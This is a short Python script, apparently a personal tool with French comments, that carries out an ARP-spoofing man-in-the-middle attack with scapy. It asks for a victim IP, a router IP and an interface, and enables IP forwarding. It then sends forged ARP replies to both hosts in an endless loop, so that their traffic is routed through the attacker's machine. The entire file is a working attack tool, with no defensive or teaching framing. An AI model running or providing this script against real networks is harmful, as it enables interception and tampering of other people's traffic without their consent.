# coding: utf-8
from scapy.all import *
import os


# récupérer mac
def mac_addr(IP):
    ans,unams = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP),timeout=2,iface=interface, inter=0.1)
    for send, receive in ans:
            return receive.sprintf(r"%Ether.src%") 

# ip forward
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
# récupère ip victime
victime = raw_input("ip victime")
router = raw_input("ip router")
interface = raw_input("interface")

macvictime = mac_addr(victime)
macrouter = mac_addr(router)
# depassement arp
while 1:
    try:
        send(ARP(op=2,pdst=victime,psrc=router,hwdst=macvictime))
        send(ARP(op=2,pdst=router,psrc=victime,hwdst=macrouter))
    except KeyboardInterrupt:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        break